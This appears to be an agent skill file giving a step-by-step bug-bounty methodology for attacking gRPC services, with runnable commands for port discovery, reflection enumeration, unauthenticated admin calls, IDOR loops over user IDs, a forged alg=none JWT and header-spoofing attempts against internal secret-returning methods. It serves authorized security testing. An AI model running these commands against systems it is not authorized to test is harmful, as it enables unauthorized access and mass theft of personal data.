---
name: hunt-grpc
description: "Hunt gRPC vulnerabilities — server reflection enabled (enumerate all services/methods), missing authentication / metadata-stripping on internal endpoints, plaintext gRPC over HTTP/2, internal endpoint disclosure, proto file leakage, gRPC-Web/grpc-gateway transcoding injection, and HTTP/2 Rapid Reset DoS (CVE-2023-44487). Use when target exposes port 50051 / 443 / 8443 / 9090 with HTTP/2, when grpcurl/grpcui detects reflection, when an Envoy or grpc-gateway proxy is fronting a microservice, or when recon reveals a microservice architecture."
sources: hackerone_public, grpc_security_research, cert_cc_advisory
report_count: 6
---

# HUNT-GRPC — gRPC Security

## Crown Jewel Targets

gRPC reflection enabled = full service catalog enumeration without source code. The highest-value gRPC bugs come from the architectural assumption that a service is "internal" — auth is enforced at the edge proxy, and the backend trusts any caller that reaches it.

**Highest-value findings:**
- **Reflection enabled in production** — enumerates every method, message, internal service
- **Missing auth on internal service** — call privileged methods directly
- **Edge-auth-only / metadata-stripping** — proxy injects x-user-id that backend trusts
- **Plaintext gRPC** — h2c cleartext on non-standard port
- **HTTP/2 Rapid Reset DoS (CVE-2023-44487)** — DoS authorization-gated

---

## Phase 1 — Fingerprint & Port Discovery

```bash
nmap -sV -p 50051,50052,443,9090,8080,8443,6565,9000 $TARGET
echo | openssl s_client -alpn h2 -connect $TARGET:443 2>/dev/null | grep -i "ALPN.*h2"
curl -s --http2-prior-knowledge -X POST "http://$TARGET:9090/x.Y/Z" \
  -H "content-type: application/grpc" -o /dev/null -D - | grep -i grpc-status
```

`grpc-status` trailer present ⇒ gRPC server behind that port.

---

## Phase 2 — Service Enumeration via Reflection

```bash
brew install grpcurl
grpcurl -plaintext $TARGET:50051 list
grpcurl -plaintext $TARGET:50051 list admin.AdminService
grpcurl -plaintext $TARGET:50051 describe admin.AdminService.DeleteUser

# Dump full catalog
for SVC in $(grpcurl -plaintext $TARGET:50051 list); do
  echo "== $SVC =="; grpcurl -plaintext $TARGET:50051 list "$SVC"
done | tee grpc-catalog.txt
grep -iE 'admin|internal|debug|secret|impersonate|exec|migrate|reset|delete' grpc-catalog.txt
```

Reflection disabled? Use leaked `.proto` with `grpcurl -protoset bundle.bin ...`.

---

## Phase 3 — Call Methods Without Authentication

```bash
# Baseline
grpcurl -plaintext $TARGET:50051 -d '{}' admin.AdminService/ListUsers

# IDOR across enumerable id field
for ID in 1 2 3 100 1000 1001; do
  grpcurl -plaintext $TARGET:50051 -d "{\"user_id\": $ID}" user.UserService/GetUser
done
```

**gRPC status codes:**
- `OK` → finding
- `Unauthenticated (16)` / `PermissionDenied (7)` → auth works, NOT a finding
- `Unimplemented (12)` → wrong method
- `InvalidArgument (3)` → callable, fix payload

---

## Phase 4 — Authentication / Trust-Boundary Bypass

```bash
# (a) alg=none JWT
grpcurl -plaintext $TARGET:50051 \
  -H "authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiIxIn0." \
  -d '{}' admin.AdminService/GetConfig

# (b) Backend-trusts-proxy headers — test common names
for H in "x-user-id: 1" "x-authenticated-user: admin" "x-tenant-id: 0" \
         "x-internal-request: true" "x-forwarded-for: 127.0.0.1" \
         "x-envoy-internal: true"; do
  grpcurl -plaintext $TARGET:50051 -H "$H" -d '{}' internal.InternalService/GetSecrets
done

# (c) Binary metadata smuggling (-bin keys)
grpcurl -plaintext $TARGET:50051 -H "auth-token-bin: $(printf admin|base64)" \
  -d '{}' admin.AdminService/GetConfig
```

---

## Phase 5 — Proto File / Schema Discovery

```bash
# Check common proto/swagger paths
for P in proto api/proto swagger.json openapiv2 descriptor.pb; do
  curl -s -o /dev/null -w '%{http_code}' "https://$TARGET/$P"
done

# GitHub search for proto files
gh search code --owner "$TARGET_ORG" 'syntax = "proto3"' --limit 20
```

---

## Phase 6 — gRPC-Web / grpc-gateway / JSON-Transcoding

```bash
# grpc-gateway: predict REST mappings
curl -s -X POST "https://$TARGET/v1/admin/users:list" -H 'content-type: application/json' -d '{}'

# Build real gRPC-Web frame
MSG=$(protoscope -s <<<'1: 1' | xxd -p | tr -d '\n')
LEN=$(printf '%08x' $((${#MSG}/2)))
FRAME=$(printf '00%s%s' "$LEN" "$MSG")
echo "$FRAME" | xxd -r -p > frame.bin
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/grpc-web+proto' -H 'x-grpc-web: 1' \
  --data-binary @frame.bin | xxd | head

# Connect protocol (buf)
curl -s "https://$TARGET/user.UserService/GetUser" \
  -H 'content-type: application/json' -H 'connect-protocol-version: 1' \
  -d '{"user_id": 1}'
```

---

## Tools

```bash
grpcurl   # primary CLI
grpcui    # web UI: grpcui -plaintext $TARGET:50051
protoc + protoscope   # build/inspect raw protobuf
buf       # lint/inspect proto
```

---

## Chain Table

| Finding | Chain to | Impact |
|---------|----------|--------|
| Reflection enabled | Enumerate all internal services | API catalog disclosure (enabler) |
| Admin method, no auth | Call privileged RPCs | Data manipulation — Critical |
| Proxy forwards x-user-id unstripped | Spoof identity → cross-tenant | Tenant isolation bypass — Critical |
| IDOR via enumerable id | Iterate user_id over GetUser | Mass PII exfil — High |
| grpc-gateway re-exposes internal RPC | Hit transcoded path unauth | Authz bypass — High/Critical |
| Plaintext h2c | MITM / sniff bearer tokens | Credential capture — High |

---

## Validation — false-positive discipline

1. **Status-code discrimination** — Confirm `grpc-status` trailer is `0` (OK)
2. **Reflection is often intentionally public** — Info disclosure (Low), not finding
3. **Distinguish "no auth" from "auth not required for this method"**
4. **Proxy-vs-backend reachability** — state how external attacker reaches it
5. **OOB / Collaborator for anything blind** — no interaction = no SSRF
6. **DoS is authorization-gated** — version-match, don't flood

**Severity:** Admin RPC callable no auth → **Critical**. Proxy metadata spoofing → **Critical**. IDOR → **High**. Internal service externally reachable → **High**. Reflection enabled → **Medium**. Proto leak → **Low**.
